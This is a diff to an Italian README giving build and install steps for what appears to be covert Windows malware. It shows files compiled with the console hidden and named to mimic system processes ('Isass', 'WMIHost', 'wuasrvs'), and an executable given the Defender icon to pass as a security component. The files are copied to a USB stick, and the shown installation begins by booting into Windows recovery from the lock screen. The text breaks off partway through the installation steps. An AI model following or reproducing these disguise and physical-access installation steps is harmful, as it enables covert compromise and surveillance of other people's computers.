@@ -77,6 +77,26 @@ Per compilare tutto é necessaria una macchina Windows, useremo nuitka per trasf
 # --windows-disable-console = no prompt quando viene eseguito
 
 4) Esegui nuitka per ogni file .py (Isass.py, WMIHost.py, wuasrvs.py)
-5) Dopo aver compilato tutti i file py devi compilare SecurityHealthSystray.bat con Bat-To-Exe-Converter (Cercalo su internte)
-6) Aggiungi l'icona di defender al file al compilatore per avere un .exe con l'icona di Defender
-7) ----------------------------------------------------------------------------------------------------
+5) Dopo aver compilato tutti i file py devi compilare SecurityHealthSystray.bat con Bat-To-Exe-Converter (Cercalo su internte) NB: INSTALLER.BAT DEVE RIMANERE RAW, NON DEVE ESSERE COMPILATO!!!
+6) Aggiungi l'icona di defender al file .bat dentro il compilatore per avere un .exe con l'icona di Defender
+----------------------------------------------------------------------------------------------------
+
+Adesso hai quasi finito!
+Copia il progetto compilato dentro una pendrive, copia il file installer.bat nella root della chiavetta, rimuovi la cartella "WPE" 
+e il risultato dovrebbe essere questo:
+
+E:\Isass.exe
+E:\Installer.bat
+E:\SecurityHealthSystray.exe
+E:\WMIHost.exe
+E:\wuasrv.exe
+E:\wuasrvs.exe
+
+Se non corrisponde hai sbagliato qualcosa.
+
+
+Come lo installo??
+1) Avvia Windows
+2) Una volta che ti trovi nella schermata di blocco, vai nel menu di spegnimento, premi "SHIFT" e poi "Riavvia"
+3) Dovresti leggere a schermo "Attendi"
+4) Dopo il riavvio vai su: 
